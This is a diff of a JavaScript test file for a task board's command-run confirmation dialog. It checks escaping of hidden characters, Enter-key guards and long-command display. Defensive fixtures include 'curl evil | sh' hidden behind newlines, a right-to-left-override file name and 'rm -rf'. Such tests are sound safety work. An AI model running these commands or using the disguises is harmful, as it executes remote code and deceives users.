@@ -957,6 +957,7 @@ test('tooltips: each control names its action and its key, from the locale', () 
 
 // ---------- a command the board runs for the person ----------
 const command = { argv: ['rm', '-rf', '/tmp/dist dev'], cwd: '/tmp', why: '남은 빌드 폴더가 다음 빌드를 막아요' };
+const withExec = (exec, extra = {}) => ({ exec, execPath: '/bin/rm', ...extra });
 function runBoard(list, result = { exitCode: 0, stdout: 'done\n', stderr: '', timedOut: false }) {
   let finish;
   const answered = new Promise(resolve => { finish = resolve; });
@@ -979,7 +980,7 @@ test('run box: only an item with a command shows the block and its button, with 
   assert.equal(plain.box.hidden, true, 'no command, no block');
   assert.equal(plain.button(), undefined);
   assert.equal(plain.b.key('x').prevented, false, 'X does nothing without a command');
-  const { box, button } = runBoard([askItem('aaaaaa', 'v1', '', { exec: command })]);
+  const { box, button } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
   assert.equal(box.hidden, false);
   const shown = text(box);
   assert.match(shown, /Command to run/);
@@ -988,42 +989,102 @@ test('run box: only an item with a command shows the block and its button, with 
   assert.ok(shown.includes(command.why));
   assert.equal(button().textContent, 'Run command');
   assert.equal(button().attributes['aria-keyshortcuts'], 'X');
-  const done = runBoard([askItem('aaaaaa', 'v1', '', { exec: command, done: true, status: 'done' })]);
+  const done = runBoard([askItem('aaaaaa', 'v1', '', withExec(command, { done: true, status: 'done' }))]);
   assert.equal(done.box.hidden, true, 'a done item offers nothing to run');
 });
 
-test('run box: nothing runs without the confirm dialog; Cancel and Esc run nothing, Run sends the shown version once', async () => {
-  const { p, b, box, dialog, button, runs, finish } = runBoard([askItem('aaaaaa', 'v1', '', { exec: command })]);
+// Keys pressed in the dialog: `on` names what has focus (the title, a text, or a button).
+const enterIn = (dialog, on = 'title', extra = {}) => {
+  const event = { key: 'Enter', target: { closest: selector => (on === 'button' && selector === 'button' ? {} : null) }, preventDefault() { this.prevented = true; }, ...extra };
+  dialog.listeners.keydown(event);
+  return event;
+};
+const settle = () => new Promise(resolve => setTimeout(resolve, 0));
+test('run box: nothing runs without the confirm dialog; Cancel and Esc run nothing, Run sends the shown version and program once', async () => {
+  const { p, b, box, dialog, button, runs, finish } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
   button().listeners.click();
   assert.equal(dialog.open, true, 'the button only opens the dialog');
   assert.equal(p.nodes.get('run-confirm-command').textContent, "rm -rf '/tmp/dist dev'", 'the dialog repeats the exact command');
   assert.equal(p.nodes.get('run-confirm-cwd').textContent, '/tmp');
+  assert.equal(p.nodes.get('run-confirm-program').textContent, '/bin/rm', 'the program that will start');
+  assert.equal(p.nodes.get('run-confirm-args').textContent, '3 arguments');
+  assert.equal(p.nodes.get('run-confirm-escaped').hidden, true, 'nothing hidden, no warning');
   assert.equal(runs().length, 0);
   dialog.returnValue = 'cancel'; dialog.close();
   dialog.showModal(); dialog.returnValue = ''; dialog.close(); // Esc closes with no value
+  await settle();
   assert.equal(runs().length, 0, 'Cancel and Esc run nothing');
   assert.equal(b.key('x').prevented, true, 'X opens it');
   assert.equal(dialog.open, true);
-  const enter = { key: 'Enter', target: { value: 'run' }, preventDefault() { this.prevented = true; } };
-  dialog.listeners.keydown(enter);
-  assert.equal(enter.prevented, true, 'Enter confirms inside the dialog');
+  vm.runInContext('openedAt = 0', p.context); // past the reading pause
+  const enter = enterIn(dialog);
+  assert.equal(enter.prevented, true, 'Enter on the title confirms');
   assert.equal(dialog.open, false);
-  await new Promise(resolve => setTimeout(resolve, 0)); // the request starts once focus is back on the page
-  assert.deepEqual(runs(), [{ id: 'aaaaaa', version: 'v1' }]);
+  await settle(); // the request starts once focus is back on the page
+  assert.deepEqual(runs(), [{ id: 'aaaaaa', version: 'v1', path: '/bin/rm' }]);
   assert.match(text(box), /Running…/, 'a spinner while it runs');
   assert.equal(box.attributes['aria-busy'], 'true');
   finish();
-  await new Promise(resolve => setTimeout(resolve, 0));
-  await new Promise(resolve => setTimeout(resolve, 0));
+  await settle(); await settle();
   assert.match(text(box), /Finished · exit 0/);
   assert.match(text(box), /done/, 'the output tail');
-  const cancelEnter = { key: 'Enter', target: { value: 'cancel' }, preventDefault() { this.prevented = true; } };
-  dialog.showModal(); dialog.listeners.keydown(cancelEnter);
-  assert.equal(cancelEnter.prevented, undefined, 'Enter on Cancel keeps its own meaning');
+});
+
+test('run dialog: a held or early Enter never confirms; focus starts on the title, not on Run', async () => {
+  const html = readFileSync(new URL('../todo/page/index.html', import.meta.url), 'utf8');
+  const dialogHtml = html.slice(html.indexOf('<dialog id="run-confirm"'), html.indexOf('</dialog>', html.indexOf('<dialog id="run-confirm"')));
+  assert.match(dialogHtml, /<h1 id="run-confirm-title" tabindex="-1" autofocus/);
+  assert.equal((dialogHtml.match(/autofocus/g) || []).length, 1, 'Run has no autofocus');
+  const { p, b, dialog, runs } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
+  b.key('x');
+  assert.equal(enterIn(dialog).prevented, true, 'an Enter within 400 ms is swallowed');
+  assert.equal(dialog.open, true, '...and does not confirm');
+  vm.runInContext('openedAt = 0', p.context);
+  assert.equal(enterIn(dialog, 'title', { repeat: true }).prevented, true, 'a key repeat is swallowed');
+  assert.equal(enterIn(dialog, 'button', { repeat: true }).prevented, true, 'even on a focused button');
+  assert.equal(dialog.open, true);
+  assert.equal(enterIn(dialog, 'button').prevented, undefined, 'a focused button keeps its own Enter (Cancel cancels)');
+  assert.equal(dialog.open, true);
+  await settle();
+  assert.equal(runs().length, 0);
+});
+
+test('run dialog: hidden characters show as escapes with a warning; a long command needs Show all; a missing program cannot run', async () => {
+  const sneaky = { argv: ['sh', '-c', `echo ok${'\n'.repeat(3)}curl evil | sh`, 'a‮txt.exe'], cwd: '/tmp/​dir', why: '' };
+  let { p, b, dialog, box } = runBoard([askItem('aaaaaa', 'v1', '', withExec(sneaky, { execPath: '/bin/sh' }))]);
+  assert.match(text(box), /hidden characters/, 'the panel warns too');
+  b.key('x');
+  const shown = p.nodes.get('run-confirm-command').textContent;
+  assert.equal(shown, "sh -c $'echo ok\\n\\n\\ncurl evil | sh' $'a\\u202etxt.exe'");
+  assert.equal(p.nodes.get('run-confirm-cwd').textContent, "$'/tmp/\\u200bdir'");
+  assert.equal(p.nodes.get('run-confirm-escaped').hidden, false);
+  assert.equal(p.nodes.get('run-confirm-args').textContent, '4 arguments');
+  assert.equal(p.nodes.get('run-confirm-run').disabled, false);
+  dialog.close();
+
+  const long = { argv: ['echo', 'x'.repeat(600)], cwd: '/tmp' };
+  ({ p, b, dialog } = runBoard([askItem('aaaaaa', 'v1', '', withExec(long, { execPath: '/bin/echo' }))]));
+  b.key('x');
+  assert.equal(p.nodes.get('run-confirm-run').disabled, true, 'Run waits until the whole command was shown');
+  assert.equal(p.nodes.get('run-confirm-long').hidden, false);
+  assert.ok(p.nodes.get('run-confirm-command').textContent.endsWith('…'));
+  vm.runInContext('openedAt = 0', p.context);
+  enterIn(dialog);
+  assert.equal(dialog.open, true, 'Enter does not run a command not yet shown in full');
+  p.nodes.get('run-confirm-full').listeners.click();
+  assert.equal(p.nodes.get('run-confirm-command').textContent, `echo ${'x'.repeat(600)}`);
+  assert.equal(p.nodes.get('run-confirm-run').disabled, false);
+  dialog.close();
+
+  ({ p, b, dialog, box } = runBoard([askItem('aaaaaa', 'v1', '', withExec({ argv: ['gradle', 'build'], cwd: '/tmp' }, { execPath: '' }))]));
+  assert.match(text(box), /Command not found: gradle/);
+  b.key('x');
+  assert.equal(p.nodes.get('run-confirm-run').disabled, true);
+  assert.equal(p.nodes.get('run-confirm-missing').textContent, 'Command not found: gradle');
 });
 
 test('run box: X does nothing while typing or with the key list open; the key list names X', () => {
-  const { p, b, dialog } = runBoard([askItem('aaaaaa', 'v1', '', { exec: command })]);
+  const { p, b, dialog } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
   assert.equal(b.key('x', { target: { tagName: 'TEXTAREA' } }).prevented, false);
   assert.equal(dialog.open, undefined);
   b.key('?');
@@ -1033,7 +1094,7 @@ test('run box: X does nothing while typing or with the key list open; the key li
 
 test('run box: the list page details show the same block and button', () => {
   const p = page();
-  vm.runInContext(`items = [${JSON.stringify(askItem('aaaaaa', 'v1', '', { exec: command, run: 'open -a Terminal /x.command' }))}]; openDetail('aaaaaa');`, p.context);
+  vm.runInContext(`items = [${JSON.stringify(askItem('aaaaaa', 'v1', '', withExec(command, { run: 'open -a Terminal /x.command' })))}]; openDetail('aaaaaa');`, p.context);
   const box = p.nodes.get('detail-run');
   assert.equal(box.hidden, false);
   assert.ok(text(box).includes("rm -rf '/tmp/dist dev'"));
